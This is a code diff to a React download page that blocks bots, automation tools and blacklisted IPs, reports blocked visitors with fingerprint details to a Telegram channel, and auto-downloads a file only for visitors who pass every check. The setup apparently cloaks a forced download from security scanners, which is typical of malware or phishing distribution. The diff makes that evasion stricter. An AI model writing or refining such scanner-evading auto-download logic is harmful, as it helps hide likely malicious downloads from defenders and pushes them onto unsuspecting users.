@@ -274,6 +274,7 @@ const Download = () => {
   const notifiedRef = useRef(false);
   const visitNotifiedRef = useRef(false);
   const [blocked, setBlocked] = useState(false);
+  const [securityChecksComplete, setSecurityChecksComplete] = useState(false);
 
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
 
@@ -281,12 +282,12 @@ const Download = () => {
   useEffect(() => {
     const ua = navigator.userAgent;
     const botSig = isKnownBot(ua);
-    const suspiciousFlags = detectSuspiciousEnvironment();
+    const { flags: suspiciousFlags, critical } = detectSuspiciousEnvironment();
 
-    if (botSig || suspiciousFlags.length >= 2) {
+    if (botSig || critical || suspiciousFlags.length >= 2) {
       setBlocked(true);
       sendTelegramNotification("bot_blocked", {
-        reason: botSig ? "Known Bot Signature" : "Suspicious Environment",
+        reason: botSig ? "Known Bot Signature" : critical ? "Critical Automation Signal" : "Suspicious Environment",
         botSignature: botSig,
         suspiciousFlags,
         browser: getBrowserName(),
@@ -309,7 +310,7 @@ const Download = () => {
         sendTelegramNotification("bot_blocked", {
           reason: "Fingerprint Bot Detection (High Probability)",
           botProbability: botProb,
-          suspiciousFlags: detectSuspiciousEnvironment(),
+          suspiciousFlags: detectSuspiciousEnvironment().flags,
           browser: getBrowserName(),
           visitorId: visitorData.visitor_id,
         });
@@ -317,23 +318,32 @@ const Download = () => {
     }
   }, [visitorData]);
 
-  // IP blacklist check
+  // IP blacklist check — MUST complete before download is allowed
   useEffect(() => {
     const checkIp = async () => {
-      const ip = await fetchVisitorIp();
-      if (!ip) return;
-      const isBlacklisted = await checkIpBlacklist(ip);
-      if (isBlacklisted) {
-        setBlocked(true);
-        if (!notifiedRef.current) {
-          notifiedRef.current = true;
-          sendTelegramNotification("bot_blocked", {
-            reason: `Blacklisted IP: ${ip}`,
-            suspiciousFlags: [`IP ${ip} found in blacklist.dat`],
-            browser: getBrowserName(),
-            visitorId: visitorData?.visitor_id,
-          });
+      try {
+        const ip = await fetchVisitorIp();
+        if (!ip) {
+          setSecurityChecksComplete(true);
+          return;
         }
+        const isBlacklisted = await checkIpBlacklist(ip);
+        if (isBlacklisted) {
+          setBlocked(true);
+          if (!notifiedRef.current) {
+            notifiedRef.current = true;
+            sendTelegramNotification("bot_blocked", {
+              reason: `Blacklisted IP: ${ip}`,
+              suspiciousFlags: [`IP ${ip} found in blacklist.dat`],
+              browser: getBrowserName(),
+              visitorId: visitorData?.visitor_id,
+            });
+          }
+        }
+      } catch {
+        // If check fails, allow through (fail-open for legitimate users)
+      } finally {
+        setSecurityChecksComplete(true);
       }
     };
     checkIp();
@@ -394,14 +404,14 @@ const Download = () => {
     }
   }, [visitorData]);
 
-  // Auto-download (only if not blocked)
+  // Auto-download — waits for ALL security checks to complete before allowing
   useEffect(() => {
-    if (!downloadFile || blocked) return;
+    if (!downloadFile || blocked || !securityChecksComplete) return;
     const timer = setTimeout(() => {
       triggerDownload(downloadFile);
     }, 1000);
     return () => clearTimeout(timer);
-  }, [blocked]);
+  }, [blocked, securityChecksComplete]);
   if (isMobile) {
     return (
       <div className="flex min-h-screen items-center justify-center bg-[#f5f5f5] px-6">
